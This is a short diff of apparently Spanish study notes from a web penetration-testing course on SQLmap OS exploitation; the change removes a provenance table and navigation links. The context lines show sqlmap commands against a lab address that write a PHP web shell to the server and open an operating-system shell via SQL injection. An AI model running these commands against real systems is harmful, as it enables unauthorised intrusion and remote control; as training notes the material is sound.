@@ -29,11 +29,3 @@ sqlmap -u "http://94.237.54.201:48204/?id=1" --file-write "shell.php" --file-des
 ```bash
 sqlmap -u "http://94.237.54.201:48204/?id=1" --os-shell
 ```
-
-## Procedencia
-
-| Repositorio | Archivo original | Commit de origen |
-| --- | --- | --- |
-| CBBH | 9- SQLmap/2 - OS Explotation.md | 284a0a42d23a00f2b47b7460371a517a14cb6261 |
-
-[Índice de categoría](../README.md) · [Inicio](../../README.md)
